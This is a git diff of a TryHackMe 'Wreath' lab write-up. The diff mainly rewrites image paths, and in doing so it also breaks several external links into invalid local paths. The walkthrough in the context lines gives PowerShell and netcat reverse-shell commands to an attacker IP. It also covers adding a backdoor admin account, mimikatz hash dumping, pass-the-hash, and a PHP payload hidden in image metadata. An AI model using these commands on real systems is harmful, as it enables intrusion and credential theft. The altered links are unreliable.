@@ -7,10 +7,10 @@ tag: [TryHackMe, WriteUp, Wreath]
 img_path: /assets/img/wreath-writeup/
 ---
 
-![wreth-network](wreath-network.png)
+![wreth-network](/assets/img/wreath-writeup/wreath-network.png)
 
 
-The Wreath Network can be found [here](https://tryhackme.com/room/wreath)
+The Wreath Network can be found [here](/assets/img/wreath-writeup/https://tryhackme.com/room/wreath)
 
 # Executive Summary
 
@@ -43,7 +43,7 @@ commonName=thomaswreath.thm organizationName=Thomas
 10000/tcp open http syn-ack MiniServ 1.890 (Webmin httpd)
 ```
 There is a redirect attempt to
-[**https://thomaswreath.thm**](https://thomaswreath.thm), so, the
+[**https://thomaswreath.thm**](/assets/img/wreath-writeup/https://thomaswreath.thm), so, the
 hostname “**thomaswreath.thm**” was added to the **/etc/hosts** file to
 map the IP address to this hostname.
 
@@ -52,8 +52,8 @@ map the IP address to this hostname.
 Investigating known exploits for each of these services, it was
 discovered that **MiniServ 1.890** is vulnerable to a command injection
 vulnerability:
-[**CVE-2019-15107**](https://nvd.nist.gov/vuln/detail/cve-2019-15107)
-Exploit proof-of-concept code in python is found [here](<https://raw.githubusercontent.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE/master/webmin-1.890_exploit.py>)
+[**CVE-2019-15107**](/assets/img/wreath-writeup/https://nvd.nist.gov/vuln/detail/cve-2019-15107)
+Exploit proof-of-concept code in python is found [here](/assets/img/wreath-writeup/<https://raw.githubusercontent.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE/master/webmin-1.890_exploit.py>)
 (Credits to **foxsin32** for sharing their PoC)
 
 ### Post-Exploitation
@@ -72,34 +72,34 @@ Using this functionality, the private SSH key can be found in
 **/root/.ssh/id_rsa**
 
 
-![exploit](id_rsa.png)
+![exploit](/assets/img/wreath-writeup/id_rsa.png)
 
 
 The private key provides access to the production server as **root** via
 SSH.
 
 
-![ssh](ssh.png)
+![ssh](/assets/img/wreath-writeup//assets/img/wreath-writeup/ssh.png)
 
 ### Post-Enumeration
 
 The next step is to search for other hosts on the network that are only reachable by the production server. Downloading a static binary of Nmap onto the host by starting a simple python server on the attack machine in the directory with the static binary and using the curl command to fetch the file from the compromised host won’t be a problem because the /tmp directory doesn’t write to disk.
 
-![curlCommand](curlCommand.png)
+![curlCommand](/assets/img/wreath-writeup/curlCommand.png)
 
-![nmapBinary](nmapBinary.png)
+![nmapBinary](/assets/img/wreath-writeup/nmapBinary.png)
 
 Once the static binary is marked as executable, a simple Nmap scan with
 the –**sn** flag will determine which hosts are alive on the network.
 
-![nmap_hosts](nmap_hosts.png)
+![nmap_hosts](/assets/img/wreath-writeup/nmap_hosts.png)
 
 The hosts at .250 and .1 are both out of scope and .200 is the
 compromised machine currently being worked from, so that leaves .**150**
 and .**100** to further enumerate for services. The two IP addresses are
 placed into a file and are imported in Nmap with the **–iL** flag.
 
-![nmap_service](nmap_service.png)
+![nmap_service](/assets/img/wreath-writeup/nmap_service.png)
 
 There is no response from .100, but .150 has a few ports open. Port 80
 will be manually inspected; however, a proxy is needed in order to
@@ -114,16 +114,16 @@ evil-winrm to accomplish tasks.
 
 First the PowerShell Empire server must be started.
 
-![empire-server](Empire-Server.png)
+![empire-server](/assets/img/wreath-writeup/Empire-Server.png)
 
 Then connect to the server with the PowerShell Empire client.
 
-![empire-client](Empire-Client.png)
+![empire-client](/assets/img/wreath-writeup/Empire-Client.png)
 
 Two listeners are created but only one will be used for now,
 HTTP-L15t3Nr. The other listener will be used later for a jump server.
 
-![listeners](listeners.png)
+![listeners](/assets/img/wreath-writeup/listeners.png)
 
 Next, I will need a bash stager to connect to the C2, which will get an
 agent started on the target. The agent will remain on the target as a
@@ -132,9 +132,9 @@ its listener to **HTTP-L15t3Nr.** Then I **execute** the stager, and a
 payload is given. This payload will be copied and pasted into our SSH
 session, and an agent will spawn a shell.
 
-![stagerPayload](stagerPAyload.png)
+![stagerPayload](/assets/img/wreath-writeup/stagerPAyload.png)
 
-![C2Connection1](C2Connection1.png)
+![C2Connection1](/assets/img/wreath-writeup/C2Connection1.png)
 
 ### Pivoting via SSHuttle
 
@@ -161,13 +161,13 @@ the webpage.
 
 The first thing I see is a 404 page with some directory information.
 
-![404](404.png)
+![404](/assets/img/wreath-writeup/404.png)
 
 Upon visiting the /registration/login page, I get a login page with a
 note about default credentials. Trying these credentials results in
 nothing.
 
-![GitStack](gitstack.png)
+![GitStack](/assets/img/wreath-writeup/gitstack.png)
 
 **Exploitation**
 
@@ -175,23 +175,23 @@ We do, however, get a service called GitStack. Using searchsploit
 results in a few known exploits for GitStack. After examining each of
 these exploits it is the exploit for 2.3.10 that I will try.
 
-![searchsploit.png](searchsploit.png)
+![searchsploit.png](/assets/img/wreath-writeup/searchsploit.png)
 
 This exploit requires a bit of modification in order to get it working
 the way I want.
 
 First set the targets IP addresses to the variable ‘ip’
 
-![](modification1.png)
+![](/assets/img/wreath-writeup/modification1.png)
 
 Then adjust the filename that the payload will be called.
 
-![](modification2.png)
+![](/assets/img/wreath-writeup/modification2.png)
 
 This exploit will create a backdoor to execute remote commands and later
 it will be used to trigger a full reverse shell on the target machine.
 
-![](exploit2.png)
+![](/assets/img/wreath-writeup/exploit2.png)
 
 This uploads the backdoor to the target and triggers the ‘whoami’
 command. I can see that I am NT **AUTHORITY\SYSTEM**, which is like
@@ -201,7 +201,7 @@ With the backdoor uploaded, I can send a post request to the malicious
 file from now on and place whatever payload I like into the ‘a=’
 parameter.
 
-![](post_requests.png)
+![](/assets/img/wreath-writeup/post_requests.png)
 
 ### Firewall 
 
@@ -214,17 +214,17 @@ shell without punching a hole in the firewall.
 To check, I will send a ping command to the attack machine from the
 compromised target and listen for ICMP requests using TCPdump.
 
-![](tcpPing.png)
+![](/assets/img/wreath-writeup/tcpPing.png)
 
 Each of the ICMP requests failed and TCPdump didn’t receive anything.
 
-![](tcpDump.png)
+![](/assets/img/wreath-writeup/tcpDump.png)
 
 This means I will have to open a port in the firewall on the production
 server in order to get a connection between the GitServer and the attack
 machine.
 
-![](firewall-cmd.png)
+![](/assets/img/wreath-writeup/firewall-cmd.png)
 
 **Jump Server and Hop Listener**
 
@@ -237,7 +237,7 @@ traffic to the main http listener.
 
 First, I created the Hop_Listener
 
-![](http_hop_listener.png)
+![](/assets/img/wreath-writeup/http_hop_listener.png)
 
 Then specify the **Host** as the Production Server IP address. I set the
 **Port** to the port I just opened on the Production Server, **23598**.
@@ -252,7 +252,7 @@ in place, I will start the PHP server by running this command in the
 
 `php –S 0.0.0.0:23597 &\>/dev/null &`
 
-![](http_hop.png)
+![](/assets/img/wreath-writeup/http_hop.png)
 
 ### Launcher Stager 
 
@@ -261,26 +261,26 @@ PowerShell launcher that connects to the jump server and then to the C2.
 I’m using the **multi/launcher** stager here and setting the
 **Listener** to be **http_hop**.
 
-![](multi_stager.png)
+![](/assets/img/wreath-writeup/multi_stager.png)
 
-![](launcher_stager.png)
+![](/assets/img/wreath-writeup/launcher_stager.png)
 
 ### Preparing for Transport
 
 Executing the launcher stager generates a PowerShell script. This script
 will be prepared for transport by URL encoding it.
 
-![](stager_encode.png)
+![](/assets/img/wreath-writeup/stager_encode.png)
 
 ### Sending the Payload
 
 With the payload now URL encoded, I send it using the post request
 method with curl.
-![](sendingStager.png)
+![](/assets/img/wreath-writeup/sendingStager.png)
 
 Now I have got a new agent in the C2 to do further enumeration on.
 
-![](C2Connection2.png)
+![](/assets/img/wreath-writeup/C2Connection2.png)
 
 Since I’m still learning how to effectively use Empire, I’ll also get a
 classic reverse shell with netcat by sending the following payload after
@@ -290,9 +290,9 @@ binary on the server, I start the listener and send the payload:
 
 `powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();\[byte\[\]\]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '\> ';$sendbyte = (\[text.encoding\]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` 
 
-![](Pwr_to_nc.png)
+![](/assets/img/wreath-writeup/Pwr_to_nc.png)
 
-![](netCat.png)
+![](/assets/img/wreath-writeup/netCat.png)
 
 
 ### Post-Exploitation
@@ -300,7 +300,7 @@ binary on the server, I start the listener and send the payload:
 Due to having access to the GitServer as NT AUTHORITY\SYSTEM, there is
 no need to escalate privileges.
 
-![](nmap_service.png)
+![](/assets/img/wreath-writeup/nmap_service.png)
 
 From the earlier port scan, **3389** and **5985** are also open. 3389 is
 used to enable users to access remote computers and 5985 is the default
@@ -319,20 +319,20 @@ net localgroup Administrators l15t3nr /add
 net localgroup “Remote Management Users” l15t3nr /add
 ```
 
-![](user_add.png)
+![](/assets/img/wreath-writeup/user_add.png)
 
 Now I can connect to a remote management shell with evil-winrm
 
 `evil-winrm –u l15t3nr –p l15t3nr -i 10.200.73.150`
 
-![](evil-winrm-l15t3nr.png)
+![](/assets/img/wreath-writeup/evil-winrm-l15t3nr.png)
 
 Next, I'll be connecting with RDP to get an interactive GUI session and
 sharing the resource to mimikatz in order to use the tool.
 
 `xfreerdp /v:10.200.73.150 /u:l15t3nr /p:l15t3nr +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share`
 
-![](RDP.png)
+![](/assets/img/wreath-writeup/RDP.png)
 
 Running the following command in an administrative command prompt will
 start mimikatz.
@@ -342,16 +342,16 @@ start mimikatz.
 Next, I give myself debug privileges and elevate the integrity to SYSTEM
 level.
 
-![](mimikatz1.png)
+![](/assets/img/wreath-writeup/mimikatz1.png)
 
 Now, I will dump all the SAM local password hashes:
 
-![](AdministratorHash.png)
+![](/assets/img/wreath-writeup/AdministratorHash.png)
 
 With the Administrator hash I can pass-the-hash using evil-winrm and
 login as the administrator.
 
-![](evil-Admin.png)
+![](/assets/img/wreath-writeup/evil-Admin.png)
 
 ### **Post-Enumeration**
 
@@ -363,14 +363,14 @@ by AV/EDR if that’s running on the system. If you’re reading this and
 you know of a better way to enumerate ports without touching disk or
 triggering AV/EDR, please let me know on Twitter **@L15t3Nr**.
 
-![](Pwr_Port_Scan.png)
+![](/assets/img/wreath-writeup/Pwr_Port_Scan.png)
 
 The **Hosts** are set to the IP address and the ports are left default.
 The **Agent** is set to the GitServer’s agent. Executing the module
 initiates the PowerShell script and it returns some interesting
 information.
 
-![](Pwr_Port_Scan_Result.png)
+![](/assets/img/wreath-writeup/Pwr_Port_Scan_Result.png)
 
 Ports **80** and **3389** are open.
 
@@ -389,15 +389,15 @@ Fetching a static binary of Chisel is simple enough. Evil-winrm has a
 convenient **upload** feature that allows me to upload tools to the
 target. 
 
-![](firewall-chisel.png)
+![](/assets/img/wreath-writeup/firewall-chisel.png)
 
 I start the chisel server on port 23600 set port 9090 as the proxy port. 
 
-![](chisel-server.png)
+![](/assets/img/wreath-writeup/chisel-server.png)
 
 The chisel client connects to the server on port 23600 and uses the proxy port of 9090. I'm using foxyproxy in my browser to navigate to the remote webpage.
 
-![](chisel-client.png)
+![](/assets/img/wreath-writeup/chisel-client.png)
 
 ## Wreath PC (.100)
 
@@ -406,17 +406,17 @@ The chisel client connects to the server on port 23600 and uses the proxy port o
 The website is a clone of the Gitserver’s webpage and it’s running php
 7.4.11
 
-![](Wreath-PC-webpage.png)
+![](/assets/img/wreath-writeup/Wreath-PC-webpage.png)
 
 The GitStack directory is worth exploring since it has more details
 about the backend.
 
-![](gitstack-dir.png)
+![](/assets/img/wreath-writeup/gitstack-dir.png)
 
 There’s an interesting git directory that I’ll download and inspect
 locally.
 
-![](Gitstack-dir2.png)
+![](/assets/img/wreath-writeup/Gitstack-dir2.png)
 
 <span id="_Toc1262132117" class="anchor"></span>**Commits**
 
@@ -431,7 +431,7 @@ clone it with:
 Now, I’ll run the GitTools extractor in the same directory as ‘.git’ and
 it creates a new directory called **Website**.
 
-![](extractor.png)
+![](/assets/img/wreath-writeup/extractor.png)
 
 This directory contains commits and identifying the order of these
 commits will help me pinpoint the most recent commit in hopes that it
@@ -442,7 +442,7 @@ Each commit has a ‘commit-meta.txt’ that I can use to get the order. I
 enter the ‘**Website**’ directory and cat out each of the
 commit-meta.txt files in each directory.
 
-![](commit-meta.png)
+![](/assets/img/wreath-writeup/commit-meta.png)
 
 The first commit is easy to find as it has no parent commit and
 corresponds to ‘0-’. The next commit in order is ‘2-’ as it has a parent
@@ -462,7 +462,7 @@ The commit order is:
 Within the ‘1-’ directory is the most up-to-date version of the website,
 and it happens to contain an upload feature in ‘**resources/index.php**’
 
-![](resources-index.png)
+![](/assets/img/wreath-writeup/resources-index.png)
 
 I can’t access the resources without valid credentials. This is where
 the hash for Thomas obtained from mimikatz came in handy. I was able to
@@ -471,7 +471,7 @@ guess the password using hashcat.
 Logging in with thomas : I\<3ruby is a success and I get access to the
 resource.
 
-![](resources-index2.png)
+![](/assets/img/wreath-writeup/resources-index2.png)
 
 ### Filter Bypass
 
@@ -539,7 +539,7 @@ exif data to test if the php will run.
 
 The filename will look something like cat-L15t3Nr.jpg.php
 
-![](cat.jpeg)
+![](/assets/img/wreath-writeup/cat.jpeg)
 
 The payload:
 
@@ -572,7 +572,7 @@ Now, to inject this payload into an image file:
 The image file looks the same, except now there is a malicious comment
 in the meta data that will run when its executed.
 
-![](meta-data.png)
+![](/assets/img/wreath-writeup/meta-data.png)
 
 Now, it's time to upload the malicious image file. The file uploads
 successfully.
@@ -582,7 +582,7 @@ http://10.200.81.100/resources/uploads/cat-L15t3Nr.jpg.php?wreath=systeminfo
 
 I get the following response:
 
-![](PoC.png)
+![](/assets/img/wreath-writeup/PoC.png)
 
 Which proves the exploit is a success! Now for a reverse shell.
 
@@ -598,11 +598,11 @@ I first created a new directory for myself in the temp directory. Then I
 uploaded the netcat binary and outputted it to my directory. Then I
 checked the directory to make sure it uploaded.
 
-![](nc-upload.png)
+![](/assets/img/wreath-writeup/nc-upload.png)
 
-![](nc-upload-proof.png)
+![](/assets/img/wreath-writeup/nc-upload-proof.png)
 
-![](l15t3nr-directory-check.png)
+![](/assets/img/wreath-writeup/l15t3nr-directory-check.png)
 
 With netcat uploaded, I can use it to connect back to my local machine
 for a reverse shell.
@@ -612,11 +612,11 @@ the following in the wreath parameter:
 
 `powershell.exe c:\\\Windows\\\Temp\\\L15t3Nr\\\nc.exe 10.50.82.91 1337 –e cmd.exe` 
 
-![](reverseshell-1.png)
+![](/assets/img/wreath-writeup/reverseshell-1.png)
 
 The command was successful, and I got a reverse shell!
 
-![](reverseshell-2.png)
+![](/assets/img/wreath-writeup/reverseshell-2.png)
 
 ### Post-Enumeration
 
@@ -633,7 +633,7 @@ whoami /priv
 The ‘SeImpersonatePrivilege’ sounds interesting. It allows me to
 “impersonate a client after authentication”
 
-![](groups-priv.png)
+![](/assets/img/wreath-writeup/groups-priv.png)
 
 I’ll also look at the Windows services and hopefully find something user
 installed.
@@ -642,7 +642,7 @@ Non-default services check:
 
 `wmic service get name,displayname,pathname,startmode | findstr /v /i “C:\Windows”` 
 
-![](windows-services.png)
+![](/assets/img/wreath-writeup/windows-services.png)
 
 There is a vulnerability known as an “Unquoted Service Path” attack,
 which could lead to a privilege escalation given that the path contains
@@ -659,13 +659,13 @@ To check who the service is running as:
 
 The service is running as local system.
 
-![](service-running.png)
+![](/assets/img/wreath-writeup/service-running.png)
 
 Now to check if the directory is writable.
 
 `powershell “get-acl –Path ‘C:\Program Files (x86)\System Explorer’ | format-list”`
 
-![](Writable-directory.png)
+![](/assets/img/wreath-writeup/Writable-directory.png)
 
 The access is given to those in the Users group, so I can write to this
 path!
@@ -706,7 +706,7 @@ Then the wrapper.cs file is compiled with mcs:
 
 `msc Wrapper.cs`
 
-![](Get-Wrapper.png)
+![](/assets/img/wreath-writeup/Get-Wrapper.png)
 
 A writable directory is located at C:\Program Files (x86)\System
 Explorer\\ and my wrapper program will be named System.exe in this
@@ -721,9 +721,9 @@ And then
 
 `sc start SystemExplorerHelpService`
 
-![](PrivilegeEscalation.png)
+![](/assets/img/wreath-writeup/PrivilegeEscalation.png)
 
-![](AllThePrivs.png)
+![](/assets/img/wreath-writeup/AllThePrivs.png)
 
 Now I have obtained all the privileges on all the machines 😊
 
